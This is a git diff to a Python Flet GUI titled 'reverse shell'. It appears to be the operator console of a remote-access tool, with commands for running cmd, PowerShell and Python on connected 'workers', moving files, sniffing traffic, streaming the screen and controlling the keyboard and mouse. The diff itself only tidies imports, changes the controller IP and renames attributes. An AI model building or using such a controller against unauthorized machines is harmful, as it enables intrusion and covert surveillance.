@@ -1,19 +1,13 @@
 from typing import Callable
-
-from flet.core.datatable import DataColumn
 from flet.core.dropdown import DropdownOption
-from idna import decode
-
-from rs_master import Master, listen_to_keys
+from rs_master import Master
 import flet as ft
 from flet.core.types import FontWeight
-import random
 import threading
-Commend = Callable[[],bytes]
-def get_options(functions:dict[str,Commend],type:str) -> list[DropdownOption]:
+def get_options(functions:list[str],type:str) -> list[DropdownOption]:
     options_list = []
     if type == "commends":
-        for function in functions.keys():
+        for function in functions:
             if function in ["live_stream","press_key_in_worker","control_mouse"]:
                 continue
             options_list.append(ft.DropdownOption(key=function))
@@ -26,7 +20,7 @@ class App:
     def __init__(self):
         self.input_required_functions: dict[str,Callable[[],ft.AlertDialog]]= {"cmd" : self.cmd,"python":self.python,"powershell":self.powershell,"receive_file":self.receive_file,"send_file":self.send_file,"sniff_from_worker":self.sniff_from_worker}
         self.page: ft.Page | None = None
-        self.master = Master("10.0.0.15",5555)
+        self.master = Master("10.0.0.11",5555)
         threading.Thread(target = self.master.connect, daemon=True).start()
         self.title = ft.Container(
             content=ft.Text("reverse shell", size=40, italic=True, weight=FontWeight.BOLD),
@@ -92,7 +86,7 @@ class App:
         self.control_keys.disabled = False
         self.livestream.disabled = False
         self.commands.disabled = False
-        self.master.address = self.workers.value
+        self.master.cur_ip = self.workers.value
         self.page.update()
     def control_mouse_of_worker(self,e):
         self.master.control_mouse = self.control_mouse.value
@@ -100,7 +94,7 @@ class App:
         self.master.control_key = self.control_keys.value
 
     def update_clients(self):
-        self.workers.options = [ft.DropdownOption(key = key, content=ft.Text(key[0])) for key in self.master.clients.keys()]
+        self.workers.options = [ft.DropdownOption(key = key) for key in self.master.clients.keys()]
         self.page.update(self.workers)
 
     def live_stream_stopped(self):
